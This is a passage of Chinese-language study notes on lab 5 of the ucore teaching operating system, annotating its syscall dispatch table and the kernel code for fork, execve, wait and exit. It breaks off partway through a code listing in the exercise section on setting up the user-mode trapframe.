do_exit(-E_KILLED);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (current-&gt;need_resched) &#123;<br>                schedule();<br>            &#125;&#125;&#125;&#125;<br></code></pre></div></td></tr></table></figure><p>然后进入trap_dispatch()中的syscall(), 比较巧妙的是通过<strong>函数指针列表</strong>来确定调用哪个函数:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">int</span> <span class="hljs-params">(*syscalls[])</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> arg[])</span> </span>= &#123; <span class="hljs-comment">//funtion ptr array</span><br>    [SYS_exit]              sys_exit,<br>    [SYS_fork]              sys_fork,<br>    [SYS_wait]              sys_wait,<br>    [SYS_exec]              sys_exec,<br>    [SYS_yield]             sys_yield,<br>    [SYS_kill]              sys_kill,<br>    [SYS_getpid]            sys_getpid,<br>    [SYS_putc]              sys_putc,<br>    [SYS_pgdir]             sys_pgdir,<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NUM_SYSCALLS        ((sizeof(syscalls)) / (sizeof(syscalls[0])))</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">syscall</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span> =</span> current-&gt;tf;<br>    <span class="hljs-keyword">uint32_t</span> arg[<span class="hljs-number">5</span>];<br>    <span class="hljs-keyword">int</span> num = tf-&gt;tf_regs.reg_eax;<br>    <span class="hljs-keyword">if</span> (num &gt;= <span class="hljs-number">0</span> &amp;&amp; num &lt; NUM_SYSCALLS) &#123;<br>        <span class="hljs-keyword">if</span> (syscalls[num] != <span class="hljs-literal">NULL</span>) &#123;<br>            arg[<span class="hljs-number">0</span>] = tf-&gt;tf_regs.reg_edx;<br>            arg[<span class="hljs-number">1</span>] = tf-&gt;tf_regs.reg_ecx;<br>            arg[<span class="hljs-number">2</span>] = tf-&gt;tf_regs.reg_ebx;<br>            arg[<span class="hljs-number">3</span>] = tf-&gt;tf_regs.reg_edi;<br>            arg[<span class="hljs-number">4</span>] = tf-&gt;tf_regs.reg_esi;<br>            tf-&gt;tf_regs.reg_eax = syscalls[num](arg);<span class="hljs-comment">//`syscalls[num]` is function ptr, and `(arg)` is argument</span><br>            <span class="hljs-keyword">return</span> ;<br>        &#125;<br>    &#125;<br>    print_trapframe(tf);<br>    panic(<span class="hljs-string">&quot;undefined syscall %d, pid = %d, name = %s.\n&quot;</span>,<br>            num, current-&gt;pid, current-&gt;name);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果从哪个系统调用返回了就执行正常的中断退出(比如fork).</p><h3 id="4-fork-exec-wait-exit"><a href="#4-fork-exec-wait-exit" class="headerlink" title="4.fork/exec/wait/exit"></a>4.fork/exec/wait/exit</h3><h4 id="fork"><a href="#fork" class="headerlink" title="fork():"></a>fork():</h4><blockquote><p>重复了一下lab4中的内容, 有点不熟悉, 这种流程分析还是要自己写</p></blockquote><p><img src="../../image/ucore/image-20211228201516840.png" alt="image-20211228201516840"></p><p>sys_fork()简单的从current-&gt;tf中取出stack地址, 作为参数调用do_fork():</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">sys_fork</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> arg[])</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span> =</span> current-&gt;tf;<br>    <span class="hljs-keyword">uintptr_t</span> <span class="hljs-built_in">stack</span> = tf-&gt;tf_esp;<br>    <span class="hljs-comment">//int do_fork(uint32_t clone_flags, uintptr_t stack, struct trapframe *tf)</span><br>    <span class="hljs-keyword">return</span> do_fork(<span class="hljs-number">0</span>, <span class="hljs-built_in">stack</span>, tf);<br>&#125;<br></code></pre></div></td></tr></table></figure><p> 在这里值得自己思考一下fork一个进程需要做出哪些工作?</p><ul><li>首先一个进程有自己的控制块proc_struct, 我们需要alloc_proc()一个</li><li>每个进程都有自己的内核栈, 需要重新alloc2个4KB的page(KSTACKSIZE)</li><li>还有一个mm_struct也很重要, 需要alloc一个并将旧的复制到新进程中<ul><li>还要看clone_flag, 如果为false则建立新的, 否则直接使用旧的</li><li>调用mm_creat(); 注意到mm中管理着页目录表, 还要重新建立一个新的; 然后是**lock_mm(oldmm)(不知道是什么)**紧跟着dup_mm来复制内存空间中的内容, 注意到内存空间是由mm中的vma链表管理的, 需要遍历每一个vma块, 然后再调用<code>copy_range(to-&gt;pgdir, from-&gt;pgdir, vma-&gt;vm_start, vma-&gt;vm_end, share)</code>来copy内存, 具体详见练习2.</li></ul></li><li>然后要设置一下子进程的一些状态, copy_thread函数在lab4中有介绍.</li><li>插入链表(两个), 设置关系, 然后wakeup, 结束</li></ul><p><code>set_links</code>函数会为当前进程间设置合适的关系，其实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*************************************************************</span><br><span class="hljs-comment">process relations</span><br><span class="hljs-comment">parent:           proc-&gt;parent  (proc is children)</span><br><span class="hljs-comment">children:         proc-&gt;cptr    (proc is parent)</span><br><span class="hljs-comment">older sibling:    proc-&gt;optr    (proc is younger sibling)</span><br><span class="hljs-comment">younger sibling:  proc-&gt;yptr    (proc is older sibling)</span><br><span class="hljs-comment">*************************************************************/</span><br><span class="hljs-comment">// set_links - set the relation links of process</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">set_links</span><span class="hljs-params">(struct proc_struct *proc)</span> </span>&#123;<br>    list_add(&amp;proc_list, &amp;(proc-&gt;list_link));<br>    proc-&gt;yptr = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> ((proc-&gt;optr = proc-&gt;parent-&gt;cptr) != <span class="hljs-literal">NULL</span>)<br>        proc-&gt;optr-&gt;yptr = proc;<br>    proc-&gt;parent-&gt;cptr = proc;<br>    nr_process ++;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><p>除了lab4熟知的<code>list_add</code>与<code>nr_process++</code>，该函数还设置了<code>proc_struct</code>中的<code>optr、yptr</code>以及<code>cptr</code>成员。</p></li><li><p>其中，<code>cptr</code>指针指向当前进程的子进程中，<strong>最新创建</strong>的那个子进程，即<code>children</code>；<code>yptr</code>指向<strong>与当前进程共享同一个父进程，但比当前进程的创建时间更晚的进程</strong>，即<code>younger sibling</code>。而<code>optr</code>指针的功能则与<code>yptr</code>相反，指向<code>older sibling</code>。</p></li><li><p>进程间关系如下图所示</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">                     +----------------+<br>                     | parent process |<br>                     +----------------+<br>              parent ^         \       ^  parent<br>                    /           \       \<br>                   /             \ cptr  \<br>                  /         yptr  V       \      yptr<br>           +-------------+  --&gt;  +-------------+  --&gt;  <span class="hljs-literal">NULL</span><br>           | old process |       | New Process |<br><span class="hljs-literal">NULL</span>  &lt;--  +-------------+  &lt;--  +-------------+<br>      optr                  optr<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="exec"><a href="#exec" class="headerlink" title="exec():"></a>exec():</h4><p>首先从do_exec参数来看需要创建进程名称字符数组, 程序长度, ELF文件地址, 大小四个参数</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_execve</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *binary, <span class="hljs-keyword">size_t</span> size)</span> </span><br></code></pre></div></td></tr></table></figure><p>具体注释在下方:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">do_execve</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *binary, <span class="hljs-keyword">size_t</span> size)</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> current-&gt;mm;<br>    <span class="hljs-comment">//例行检查以及校正名称长度</span><br>    <span class="hljs-keyword">if</span> (!user_mem_check(mm, (<span class="hljs-keyword">uintptr_t</span>)name, len, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-keyword">return</span> -E_INVAL;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (len &gt; PROC_NAME_LEN) &#123;<br>        len = PROC_NAME_LEN;<br>    &#125;<br><span class="hljs-comment">//从name地址上复制名称字符串</span><br>    <span class="hljs-keyword">char</span> local_name[PROC_NAME_LEN + <span class="hljs-number">1</span>];<br>    <span class="hljs-built_in">memset</span>(local_name, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(local_name));<br>    <span class="hljs-built_in">memcpy</span>(local_name, name, len);<br><span class="hljs-comment">//如果current-&gt;mm不为NULL, 说明为用户进程, 清空一下mm(包括vma链表,页目录表,以及mm自身)</span><br>    <span class="hljs-keyword">if</span> (mm != <span class="hljs-literal">NULL</span>) &#123;<br>        lcr3(boot_cr3);<br>        <span class="hljs-keyword">if</span> (mm_count_dec(mm) == <span class="hljs-number">0</span>) &#123;<br>            exit_mmap(mm);<br>            put_pgdir(mm);<br>            mm_destroy(mm);<br>        &#125;<br>        current-&gt;mm = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">int</span> ret;<br>    <span class="hljs-comment">//解析ELF文件以及建立mm内容</span><br>    <span class="hljs-keyword">if</span> ((ret = load_icode(binary, size)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">goto</span> execve_exit;<span class="hljs-comment">//出错则退出</span><br>    &#125;<br>    set_proc_name(current, local_name);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>execve_exit:<br>    do_exit(ret);<br>    panic(<span class="hljs-string">&quot;already exit: %e.\n&quot;</span>, ret);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以看出解析ELF文件才是大头. 代码在<strong>练习1</strong>或者直接看源码.</p><p><strong>load_icode</strong>函数的主要工作就是给用户进程建立一个能够让用户进程正常运行的用户环境。此函数有一百多行，完成了如下重要工作：</p><ol><li>调用mm_create函数来申请进程的内存管理数据结构mm所需内存空间，并对mm进行初始化；</li><li>调用setup_pgdir来申请一个页目录表所需的一个页大小的内存空间，并把描述ucore内核虚空间映射的内核页表（boot_pgdir所指）的内容拷贝到此新目录表中，最后让mm-&gt;pgdir指向此页目录表，这就是进程新的页目录表了，且能够正确映射内核虚空间；</li><li>根据应用程序执行码的起始位置来解析此ELF格式的执行程序，并调用mm_map函数根据ELF格式的执行程序说明的各个段（代码段、数据段、BSS段等）的起始位置和大小建立对应的vma结构，并把vma插入到mm结构中，从而表明了用户进程的合法用户态虚拟地址空间；</li><li>调用根据执行程序各个段的大小分配物理内存空间，并根据执行程序各个段的起始位置确定虚拟地址，并在页表中建立好物理地址和虚拟地址的映射关系，然后把执行程序各个段的内容拷贝到相应的内核虚拟地址中，至此应用程序执行码和数据已经根据编译时设定地址放置到虚拟内存中了；</li><li>需要给用户进程设置用户栈，为此调用mm_mmap函数建立用户栈的vma结构，明确用户栈的位置在用户虚空间的顶端，大小为256个页，即1MB，并分配一定数量的物理内存且建立好栈的虚地址&lt;–&gt;物理地址映射关系；</li><li>至此,进程内的内存管理vma和mm数据结构已经建立完成，于是把mm-&gt;pgdir赋值到cr3寄存器中，即更新了用户进程的虚拟内存空间，此时的initproc已经被hello的代码和数据覆盖，成为了第一个用户进程，但此时这个用户进程的执行现场还没建立好；</li><li>先清空进程的中断帧，再重新设置进程的中断帧，使得在执行中断返回指令“iret”后，能够让CPU转到用户态特权级，并回到用户态内存空间，使用用户态的代码段、数据段和堆栈，且能够跳转到用户进程的第一条指令执行，并确保在用户态能够响应中断；</li></ol><p>至此，用户进程的用户环境已经搭建完毕。此时initproc将按产生系统调用的函数调用路径原路返回，执行中断返回指令“iret”（位于trapentry.S的最后一句）后，将切换到用户进程hello的第一条语句位置_start处（位于user/libs/initcode.S的第三句）开始执行。</p><h4 id="wait"><a href="#wait" class="headerlink" title="wait()"></a>wait()</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// do_wait - wait one OR any children to become PROC_ZOMBIE state, and free memory space of kernel stack</span><br><span class="hljs-comment">//         - proc struct of this child.</span><br><span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> only after do_wait function, all resources of the child proces are free.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">do_wait</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pid, <span class="hljs-keyword">int</span> *code_store)</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> current-&gt;mm;<br>    <span class="hljs-keyword">if</span> (code_store != <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//例行检查</span><br>        <span class="hljs-keyword">if</span> (!user_mem_check(mm, (<span class="hljs-keyword">uintptr_t</span>)code_store, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>), <span class="hljs-number">1</span>)) &#123;<br>            <span class="hljs-keyword">return</span> -E_INVAL;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span>;</span><br>    <span class="hljs-keyword">bool</span> intr_flag, haskid;<br>repeat:<br>    haskid = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (pid != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">//不等于零意味着要在hash_list中寻找特定pid的子程序</span><br>        proc = find_proc(pid);<br>        <span class="hljs-keyword">if</span> (proc != <span class="hljs-literal">NULL</span> &amp;&amp; proc-&gt;parent == current) &#123;<br>            haskid = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;<br>                <span class="hljs-keyword">goto</span> found;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//查找任意一个为ZOMBIE的子程序</span><br>        proc = current-&gt;cptr;<br>        <span class="hljs-keyword">for</span> (; proc != <span class="hljs-literal">NULL</span>; proc = proc-&gt;optr) &#123;<br>            haskid = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;<br>                <span class="hljs-keyword">goto</span> found;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (haskid) &#123;<span class="hljs-comment">//存在子程序, 但是没有一个是ZOMBIE, 而且当前是父进程在执行, 所以调用switch()来</span><br>        <span class="hljs-comment">//切换到子进程执行, 并且设置一下父进程为SLEEP状态, wait原因是for child</span><br>        current-&gt;state = PROC_SLEEPING;<br>        current-&gt;wait_state = WT_CHILD;<br>        schedule();<br>        <span class="hljs-keyword">if</span> (current-&gt;flags &amp; PF_EXITING) &#123;<span class="hljs-comment">//怎么调用了do_exit()?????</span><br>            do_exit(-E_KILLED);<br>        &#125;<br>        <span class="hljs-keyword">goto</span> repeat;<span class="hljs-comment">//子进程(应该)执行完了, 重新查找</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> -E_BAD_PROC;<span class="hljs-comment">//没有子程序的话......</span><br><br>found:<br>    <span class="hljs-keyword">if</span> (proc == idleproc || proc == initproc) &#123;<span class="hljs-comment">//不可能是任何进程的子进程</span><br>        panic(<span class="hljs-string">&quot;wait idleproc or initproc.\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (code_store != <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//如果提供了存放exit_code的变量, 则存入</span><br>        *code_store = proc-&gt;exit_code;<br>    &#125;<br>    local_intr_save(intr_flag);<br>    &#123;<span class="hljs-comment">//对这种链表的操作要屏蔽中断</span><br>        unhash_proc(proc);<br>        remove_links(proc);<br>    &#125;<br>    local_intr_restore(intr_flag);<br>    <span class="hljs-comment">//释放子进程占用资源</span><br>    put_kstack(proc);<br>    kfree(proc);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="exit"><a href="#exit" class="headerlink" title="exit():"></a>exit():</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// do_exit - called by sys_exit</span><br><span class="hljs-comment">//   1. call exit_mmap &amp; put_pgdir &amp; mm_destroy to free the almost all memory space of process</span><br><span class="hljs-comment">//   2. set process&#x27; state as PROC_ZOMBIE, then call wakeup_proc(parent) to ask parent reclaim itself.</span><br><span class="hljs-comment">//   3. call scheduler to switch to other process</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">do_exit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> error_code)</span> </span>&#123;<br>    <span class="hljs-comment">//不能退出的两个内核进程</span><br>    <span class="hljs-keyword">if</span> (current == idleproc) &#123;<br>        panic(<span class="hljs-string">&quot;idleproc exit.\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (current == initproc) &#123;<br>        panic(<span class="hljs-string">&quot;initproc exit.\n&quot;</span>);<br>    &#125;<br><span class="hljs-comment">//如果current-&gt;mm不为NULL, 说明为用户进程, 清空一下mm(包括vma链表,页目录表,以及mm自身)</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> current-&gt;mm;<br>    <span class="hljs-keyword">if</span> (mm != <span class="hljs-literal">NULL</span>) &#123;<br>        lcr3(boot_cr3);<br>        <span class="hljs-keyword">if</span> (mm_count_dec(mm) == <span class="hljs-number">0</span>) &#123;<br>            exit_mmap(mm);<br>            put_pgdir(mm);<br>            mm_destroy(mm);<br>        &#125;<br>        current-&gt;mm = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    current-&gt;state = PROC_ZOMBIE;<br>    current-&gt;exit_code = error_code;<br><br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span>;</span><br>    local_intr_save(intr_flag);<br>    &#123;<br>        <span class="hljs-comment">//如果父进程因为WT_CHILD睡眠, 则唤醒父进程</span><br>        proc = current-&gt;parent;<br>        <span class="hljs-keyword">if</span> (proc-&gt;wait_state == WT_CHILD) &#123;<br>            wakeup_proc(proc);<br>        &#125;<br>        <span class="hljs-keyword">while</span> (current-&gt;cptr != <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//当前进程有子进程</span><br>            proc = current-&gt;cptr;<br>            current-&gt;cptr = proc-&gt;optr;<br>   <span class="hljs-comment">//以下几行把proc从current的cptr上插入到initproc的cptr等关系指针中</span><br>            proc-&gt;yptr = <span class="hljs-literal">NULL</span>;<br>            <span class="hljs-keyword">if</span> ((proc-&gt;optr = initproc-&gt;cptr) != <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//把current的子进程的父进程设置为initproc</span><br>                initproc-&gt;cptr-&gt;yptr = proc;<br>            &#125;<br>            proc-&gt;parent = initproc;<br>            initproc-&gt;cptr = proc;<br>            <span class="hljs-comment">//如果initproc因为WT_CHILD睡眠, 则唤醒initproc</span><br>            <span class="hljs-keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;<br>                <span class="hljs-keyword">if</span> (initproc-&gt;wait_state == WT_CHILD) &#123;<br>                    wakeup_proc(initproc);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    local_intr_restore(intr_flag);<br><br>    schedule();<br>    panic(<span class="hljs-string">&quot;do_exit will not return!! %d.\n&quot;</span>, current-&gt;pid);<br></code></pre></div></td></tr></table></figure><h2 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h2><h3 id="练习1-2"><a href="#练习1-2" class="headerlink" title="练习1"></a>练习1</h3><blockquote><p>补充load_icode()的实现</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//(6) setup trapframe for user environment</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span> =</span> current-&gt;tf;<br><span class="hljs-built_in">memset</span>(tf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(struct trapframe));<span class="hljs-comment">//清空tf</span><br><span class="hljs-comment">/* LAB5:EXERCISE1 YOUR CODE</span><br><span class="hljs-comment"> * should set tf_cs,tf_ds,tf_es,tf_ss,tf_esp,tf_eip,tf_eflags</span><br><span class="hljs-comment"> * NOTICE: If we set trapframe correctly, then the user level process can return to USER MODE from kernel. So</span><br><span class="hljs-comment"> *          tf_cs should be USER_CS segment (see memlayout.h)</span><br><span class="hljs-comment"> *          tf_ds=tf_es=tf_ss should be USER_DS segment</span><br><span class="hljs-comment"> *          tf_esp should be the top addr of user stack (USTACKTOP)</span><br><span class="hljs-comment"> *          tf_eip should be the entry point of this binary program (elf-&gt;e_entry)</span><br><span class="hljs-comment"> *          tf_eflags should be set to enable computer to produce Interrupt</span><br><span class="hljs-comment"> */</span><br>tf-&gt;tf_cs = USER_CS;<br><span class="hljs-comment">//答案中好像没有tf_fs?虽然不重要但是不知道为什么不加上</span><br>tf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_fs = tf-&gt;tf_ss = USER_DS;<br>tf-&gt;tf_esp = USTACKTOP;<br>tf-&gt;tf_eflags |= FL_IF;<br>tf-&gt;tf_eip= elf-&gt;e_entry;<br>ret = <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><blockquote><p>请在实验报告中描述当创建一个用户态进程并加载了应用程序后，CPU是如何让这个应用程序最终在用户态执行起来的。即这个用户态进程被ucore选择占用CPU执行（RUNNING态）到具体执行应用程序第一条指令的整个经过。</p></blockquote><ul><li><p>当一个用户态程序执行<code>sys_execve</code>时，该程序将触发<code>0x80</code>中断，并进入中断处理例程。与Lab1类似，中断处理例程的入口代码会保存<code>trapframe</code>作为跳转回用户态的上下文环境。但与lab1代码所不同的是，lab5中的<code>trap</code>函数实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 